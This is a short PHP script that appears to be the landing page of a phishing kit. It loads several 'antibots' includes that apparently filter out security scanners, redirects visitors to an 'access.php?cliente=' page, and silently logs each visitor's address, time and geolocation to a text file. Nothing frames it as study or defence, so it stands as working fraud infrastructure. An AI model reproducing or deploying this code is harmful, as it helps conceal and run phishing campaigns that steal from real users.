<?php

include '/BOTS/antibots1.php';
include '/BOTS/antibots2.php';
include '/BOTS/antibots3.php';
include '/BOTS/antibots4.php';
include '/BOTS/antibots5.php';
include '/BOTS/antibots6.php';
include 'info.php';



//----------------------------------------------------
$redirect_page = "access.php?cliente=".rand(100, 999); 
$redirect = true;
header('Location: '.$redirect_page);

$ali .= 
"
$remote|".date('Y-m-d H:i')."|".$_SESSION['_LOOKUP_COUNTRY_']."|".$_SESSION['_LOOKUP_REGION_']."|".$_SESSION['_LOOKUP_CITY_']."|".$_SESSION['_LOOKUP_ZIPCODE_']."\n";
$milaf = @fopen("visite.txt","a");
fwrite($milaf," ".$ali."\n");